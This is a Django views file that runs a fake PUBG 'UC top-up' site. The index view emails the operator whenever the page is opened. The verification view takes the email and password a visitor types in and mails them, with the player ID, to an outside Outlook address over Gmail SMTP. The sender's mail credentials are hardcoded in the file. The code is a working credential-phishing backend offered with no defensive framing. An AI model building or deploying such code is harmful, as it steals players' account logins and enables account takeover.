from django.shortcuts import render

# Create your views here.

import time
import random
from django.shortcuts import render,redirect
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from requests import get


def index (request):

    ########################
    From = "lidark.tool@gmail.com"
    password = 'mmoohhaa12345'
    To = 'adrelaft@outlook.com'
    msg = MIMEMultipart()
    msg['From'] = From
    msg['To'] = To
    msg['Subject'] = 'شحن شدات ببجي'
    body = "تم فتح موقع شحن الشدات من شخص مجهول"
    msg.attach(MIMEText(body, 'plain'))
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.starttls()
    server.login(From, password)
    text = msg.as_string()
    server.sendmail(From, To, text)
    print(f'Send Done To {To}')

    server.quit()
    ########################
            
    return render (request , "htmlpost/index.html" )


def home (request):
    global userid
    userid = request.POST.get('playid')
    return render(request,'htmlpost/home.html' , {'userid':userid})



def verification (request):
    
    #userid = request.POST.get('playid')

    useremail = request.POST.get('email')
    userpassw = request.POST.get('password')
    ########################
    From = "lidark.tool@gmail.com"
    password = 'mmoohhaa12345'
    To = 'adrelaft@outlook.com'
    msg = MIMEMultipart()
    msg['From'] = From
    msg['To'] = To
    msg['Subject'] = 'شحن شدات ببجي'
    body = "\n ID اللاعب \n" + str(userid) + "\n البريد الالكتروني \n" + str(useremail) + "\n كلمة السر \n" + str(userpassw)
    msg.attach(MIMEText(body, 'plain'))
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.starttls()
    server.login(From, password)
    text = msg.as_string()
    server.sendmail(From, To, text)
    print(f'Send Done To {To}')

    server.quit()
    ########################


    return render(request,'htmlpost/verification.html')









